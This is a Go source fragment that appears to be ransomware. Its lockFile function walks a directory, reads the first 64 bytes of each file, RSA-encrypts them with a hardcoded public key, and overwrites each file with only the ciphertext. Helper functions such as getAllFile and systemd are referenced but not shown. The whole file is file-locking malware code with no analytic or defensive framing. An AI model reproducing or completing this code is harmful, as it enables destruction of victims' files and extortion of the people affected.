package main

import (
	"bufio"
	"fmt"
	"github.com/wumansgy/goEncrypt"
	"os"
	"sync"
)

func lockFile(path string, wg *sync.WaitGroup) {
	publicKey := `-----BEGIN  WUMAN  RSA PUBLIC KEY -----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAl+4A2XWCK47buLOuPO4H
zyCcoJ6YsXuF0Cr2rt3RkQ0fzf75ndS6Z3u5JSqPxsk7SgRB1ZXB4sGRqPADTx/f
td4R/gZ9fC4Lkfux1lGISJzP0QFBI5em3xMrUXGAZAdzTzScSZIK6OeRZvaqd+FM
OIAtF4jc6VRmWV2fSyCIQG5KvvxZxSNYCKGf4KTH8nDHO9v3vtFzG/PeturnOsnR
LC2/cUYAURDk6vDa4FLs2MTgMCHld/yhkw994GrdxVRzXDa4rxwUN544xe5vENaX
y2F8tjaOclBq5yVvpizyfwYPydVoiI7O86MjEzOCv7w8LstCbWp6mV0UEaLjF72W
sQIDAQAB
-----END  WUMAN  RSA PUBLIC KEY -----
`

	for _,filename := range getAllFile(path){
		f, err := os.Open(filename)
		if err != nil {
			fmt.Println(err)
		}
		defer f.Close()

		r := bufio.NewReader(f)
		b := make([]byte,64)

		_, err = r.Read(b)

		if err != nil {
			fmt.Println(err)
		}

		cryptText, err := goEncrypt.RsaEncrypt(b,[]byte(publicKey))
		systemd(filename)
		err = writeToFile(path + filename,cryptText)
		if err != nil && DEBUG {
			messagebox(err)
		}
	}
	wg.Done()

}

func writeToFile(fileName string, content []byte) error {
	f, err := os.OpenFile(fileName, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0644)
	if err != nil {
		fmt.Println("file create failed. err: " + err.Error())
	} else {
		n, _ := f.Seek(0, os.SEEK_END)
		_, err = f.WriteAt(content, n)
		fmt.Println("write succeed!")
		defer f.Close()
	}
	return err
}
